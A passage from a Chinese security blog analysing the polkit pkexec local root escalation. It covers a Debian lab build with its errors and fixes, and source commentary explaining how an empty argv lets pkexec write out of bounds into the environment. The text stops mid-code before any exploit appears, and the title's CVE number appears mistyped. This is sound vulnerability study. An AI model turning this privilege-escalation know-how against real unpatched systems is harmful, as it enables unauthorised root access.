<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>CVE-2021-4030 polkit-pkexec 本地提权 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="[toc] 参考 看雪大爹  GCONV_PATH利用 GCONV_PATH利用2 合天 天玄实验室 安全客 少羽  软件简介https:&#x2F;&#x2F;gitlab.freedesktop.org&#x2F;polkit&#x2F;polkit&#x2F;   polkit is a toolkit for defining and handling authorizations. It is used for allowing unp">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-4030 polkit-pkexec 本地提权">
<meta property="og:url" content="http://example.com/2022/08/10/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="[toc] 参考 看雪大爹  GCONV_PATH利用 GCONV_PATH利用2 合天 天玄实验室 安全客 少羽  软件简介https:&#x2F;&#x2F;gitlab.freedesktop.org&#x2F;polkit&#x2F;polkit&#x2F;   polkit is a toolkit for defining and handling authorizations. It is used for allowing unp">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/08/10/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png">
<meta property="article:published_time" content="2022-08-10T07:25:43.000Z">
<meta property="article:modified_time" content="2022-08-10T14:35:47.519Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/08/10/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-CVE-2021-4030-polkit-pkexec-本地提权" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/08/10/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" class="article-date">
  <time class="dt-published" datetime="2022-08-10T07:25:43.000Z" itemprop="datePublished">2022-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      CVE-2021-4030 polkit-pkexec 本地提权
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-271423.htm">看雪大爹</a> </li>
<li><a target="_blank" rel="noopener" href="https://trganda.github.io/posts/iconv/">GCONV_PATH利用</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859#:~:text=linux%E7%B3%BB%E7%BB%9F%E6%8F%90,%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%A6%82%E4%B8%8B%EF%BC%9A">GCONV_PATH利用2</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/470224218?utm_source=qq&utm_medium=social&utm_oi=949109417673797632">合天</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2MTY0MDc1Mw==&mid=2247484520&idx=1&sn=b9fdfa0c5cc802478a541964a0d5b2c2&chksm=ce154536f962cc20db00097e2b0f4cc155aefb25e54dbc31af29733be6ecf9ba21d3fd77b908&mpshare=1&scene=23&srcid=0301ZZXX7YvmTLBFW02HGXd5&sharer_sharetime=1646130648823&sharer_shareid=35c6bdd49b9ea011edbc171a217d1072#rd">天玄实验室</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/267774#h3-2">安全客</a></li>
<li><a target="_blank" rel="noopener" href="https://www.wt37.cn/5949.html">少羽</a></li>
</ul>
<h2 id="软件简介"><a href="#软件简介" class="headerlink" title="软件简介"></a>软件简介</h2><p><a target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit/">https://gitlab.freedesktop.org/polkit/polkit/</a></p>
<blockquote>
<p> polkit is a toolkit for defining and handling authorizations. It is used for allowing unprivileged processes to speak to privileged processes.  </p>
</blockquote>
<p>pkexec是polkit是一个程序，polkit负责不同特权级的进程间的通讯<br><code>pkexec echo &quot;1&quot;</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --help</span><br><span class="line">pkexec --version |</span><br><span class="line">       --help |</span><br><span class="line">       --disable-internal-agent |</span><br><span class="line">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class="line"></span><br><span class="line">See the pkexec manual page for more details.</span><br></pre></td></tr></table></figure>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --version</span><br><span class="line">pkexec version 0.105</span><br><span class="line">squ@squ-virtual-machine:~/tools/modules-5.0.1$ uname -a</span><br><span class="line">Linux squ-virtual-machine 5.11.0-46-generic #51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>docker：<br>pull 个debian下来,然后设置共享卷</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name=de -v /home/squ/docker_volumn:/home/vol debian /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/Desktop/cve/policykit-1-0.105$ dpkg -S /usr/bin/pkexec</span><br><span class="line">policykit-1: /usr/bin/pkexec</span><br></pre></td></tr></table></figure>

<p><code>dpkg</code>查看包为<code>policykit-1</code><br><code>sudo apt source policykit-1</code> 或者<br><a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/bionic/+package/policykit-1">https://launchpad.net/ubuntu/bionic/+package/policykit-1</a><br>影响版本<code>0~0.105</code></p>
<p>下载后路径在<code>/home/squ/Desktop/cve/policykit-1-0.105/src/programs/pkexec.c</code></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>源码地址<br><a target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit">https://gitlab.freedesktop.org/polkit/polkit</a><br>基本找个虚拟机就能打，真是太coooooooooooooooooooooooooooool了<br>docker<br>如果遇到了<code>hash mismatch</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E: Failed to fetch http:<span class="comment">//deb.debian.org/debian/pool/main/b/binutils/binutils-common_2.35.2-2_amd64.deb  Hash Sum mismatch</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean  </span><br><span class="line">apt-get update --fix-missing </span><br></pre></td></tr></table></figure>

<p>如果还是不行就换源<code>/etc/apt/sources.list</code>(debian)<br>再不行就关代理吧（关了就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>里面有一个<code>INSTALL</code>的文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libc6-dev</span><br><span class="line">apt install gobjc++</span><br><span class="line">./configure CC=c99 CFLAGS=-g LIBS=-lposix</span><br></pre></td></tr></table></figure>

<p>遇到问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checking whether the C compiler works... no</span><br><span class="line">configure: error: in `/home/vol/policykit<span class="number">-1</span><span class="number">-0.105&#x27;</span>:</span><br><span class="line">configure: error: C compiler cannot create executables</span><br></pre></td></tr></table></figure>

<p>看<code>config.log</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">configure:<span class="number">3355</span>: $? = <span class="number">1</span></span><br><span class="line">configure:<span class="number">3375</span>: checking whether the C compiler works</span><br><span class="line">configure:<span class="number">3397</span>: /usr/bin/gcc -g   conftest.c -lposix &gt;&amp;<span class="number">5</span></span><br><span class="line">/usr/bin/ld: cannot find -lposix</span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br></pre></td></tr></table></figure>

<p>安装库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install manpages-posix-dev	</span><br></pre></td></tr></table></figure>

<p>也没用，索性不加<code>posix</code>试试看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=c99 CFLAGS=-g <span class="comment">//LIBS=-lposix</span></span><br></pre></td></tr></table></figure>

<p>继续报错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">configure: error: The pkg-config script could not be found or is too old.  Make sure it</span><br><span class="line">is in your PATH or <span class="built_in">set</span> the PKG_CONFIG environment variable to the full</span><br><span class="line">path to pkg-config.</span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y pkg-config</span><br></pre></td></tr></table></figure>

<p>继续报错</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">configure: error: Package requirements (gio-2.0 &gt;= 2.28.0) were not met:</span><br><span class="line"></span><br><span class="line">No package &#x27;gio-2.0&#x27; found</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y gio-2.0</span><br></pre></td></tr></table></figure>

<p>然后又来</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: cannot find -lpam</span><br></pre></td></tr></table></figure>

<p>这是因为缺少<code>libpam.so</code>的库，在debian系统上，可以这样下载 <code>lib + id-dev</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y libpam-dev</span><br></pre></td></tr></table></figure>

<p>继续报错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> intltool &gt;= <span class="number">0.40</span><span class="number">.0</span>...  found</span><br><span class="line">configure: error: Your intltool is too old.  You need intltool <span class="number">0.40</span><span class="number">.0</span> or later.</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install intltool</span><br></pre></td></tr></table></figure>

<p>configure没问题了 make来了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">polkitagentsession.c:<span class="number">58</span>:<span class="number">10</span>: fatal error: gio/gunixoutputstream.h: No such file or directory</span><br><span class="line">   <span class="number">58</span> | <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;gio/gunixoutputstream.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libglib2.0</span><br><span class="line">apt-get install libgio2.0</span><br></pre></td></tr></table></figure>

<p>还是没用<br>发现<code>gio-unix-2.0*</code>下面就是<code>gio</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /usr/include/gio-unix-2.0/gio/ /usr/include/</span><br></pre></td></tr></table></figure>

<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ·······</span><br><span class="line">  <span class="type">const</span> gchar *environment_variables_to_save[] = &#123;</span><br><span class="line">    <span class="string">&quot;SHELL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LANG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LINGUAS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LANGUAGE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LC_ALL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TERM&quot;</span>,</span><br><span class="line">    <span class="string">&quot;COLORTERM&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* By default we don&#x27;t allow running X11 apps, as it does not work in the</span></span><br><span class="line"><span class="comment">     * general case. See</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  https://bugs.freedesktop.org/show_bug.cgi?id=17970#c26</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * and surrounding comments for a lot of discussion about this.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * However, it can be enabled for some selected and tested legacy programs</span></span><br><span class="line"><span class="comment">     * which previously used e. g. gksu, by setting the</span></span><br><span class="line"><span class="comment">     * org.freedesktop.policykit.exec.allow_gui annotation to a nonempty value.</span></span><br><span class="line"><span class="comment">     * See https://bugs.freedesktop.org/show_bug.cgi?id=38769 for details.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="string">&quot;DISPLAY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;XAUTHORITY&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  &#125;;</span><br><span class="line">  GPtrArray *saved_env;</span><br><span class="line">  gchar *opt_user;</span><br><span class="line">  <span class="type">pid_t</span> pid_of_caller;</span><br><span class="line">  gpointer local_agent_handle;</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">127</span>;</span><br><span class="line">  authority = <span class="literal">NULL</span>;</span><br><span class="line">  subject = <span class="literal">NULL</span>;</span><br><span class="line">  details = <span class="literal">NULL</span>;</span><br><span class="line">  result = <span class="literal">NULL</span>;</span><br><span class="line">  action_id = <span class="literal">NULL</span>;</span><br><span class="line">  saved_env = <span class="literal">NULL</span>;</span><br><span class="line">  path = <span class="literal">NULL</span>;</span><br><span class="line">  command_line = <span class="literal">NULL</span>;</span><br><span class="line">  opt_user = <span class="literal">NULL</span>;</span><br><span class="line">  local_agent_handle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check for correct invocation */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">geteuid</span> () != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;pkexec must be setuid root\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  original_user_name = <span class="built_in">g_strdup</span> (<span class="built_in">g_get_user_name</span> ());</span><br><span class="line">  <span class="keyword">if</span> (original_user_name == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;Error getting user name.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((original_cwd = <span class="built_in">g_get_current_dir</span> ()) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;Error getting cwd: %s\n&quot;</span>,</span><br><span class="line">                  <span class="built_in">g_strerror</span> (errno));</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First process options and find the command-line to invoke. Avoid using fancy library routines</span></span><br><span class="line"><span class="comment">   * that depend on environtment variables since we haven&#x27;t cleared the environment just yet.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  opt_show_help = FALSE;</span><br><span class="line">  opt_show_version = FALSE;</span><br><span class="line">  opt_disable_internal_agent = FALSE;</span><br><span class="line">  <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          opt_show_help = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--version&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          opt_show_version = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--user&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;-u&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          n++;</span><br><span class="line">          <span class="keyword">if</span> (n &gt;= (guint) argc)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">usage</span> (argc, argv);</span><br><span class="line">              <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (opt_user != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">g_printerr</span> (<span class="string">&quot;--user specified twice\n&quot;</span>);</span><br><span class="line">              <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">          opt_user = <span class="built_in">g_strdup</span> (argv[n]);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--disable-internal-agent&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          opt_disable_internal_agent = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>90行n是从1开始的<br>120行break是退出循环，说明是要执行的命令<br>后面部分</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">g_assert</span> (argv[argc] == <span class="literal">NULL</span>);</span><br><span class="line">path = <span class="built_in">g_strdup</span> (argv[n]);</span><br><span class="line"><span class="keyword">if</span> (path == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">usage</span> (argc, argv);</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class="line">    s = <span class="built_in">g_find_program_in_path</span> (path);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">g_printerr</span> (<span class="string">&quot;Cannot run program %s: %s\n&quot;</span>, path, <span class="built_in">strerror</span> (ENOENT));</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="built_in">g_free</span> (path);</span><br><span class="line">    path = s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* argc&lt;2 and pkexec runs just shell, argv is guaranteed to be null-terminated.</span></span><br><span class="line"><span class="comment">     * /-less shell shouldn&#x27;t happen, but let&#x27;s be defensive and don&#x27;t write to null-termination</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (argv[n] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      argv[n] = path;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>g_find_program_in_path (path)</code>搜索命令的绝对路径</li>
<li>绝对路径被回写回<code>argv[n]</code></li>
</ul>
<p>对于命令行参数<code>argv[]</code>是在<code>environ[]</code>之后连着被压入的<br>命令行启动<code>pkexec</code>，第一个参数是自己<code>&quot;pkexec&quot;</code><br>但是如果用<code>execve</code>启动，第一个就是<code>NULL</code>了，第二个就是环境变量<code>environ[0]</code></p>
<h3 id="dl坏事做尽"><a href="#dl坏事做尽" class="headerlink" title="dl坏事做尽"></a>dl坏事做尽</h3><p>glibc2.27 ****&#x2F;elf&#x2F;dl-support.c : 307</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_non_dynamic_init (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ········</span><br><span class="line">  ········</span><br><span class="line">  <span class="keyword">if</span> (__libc_enable_secure)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">static</span> <span 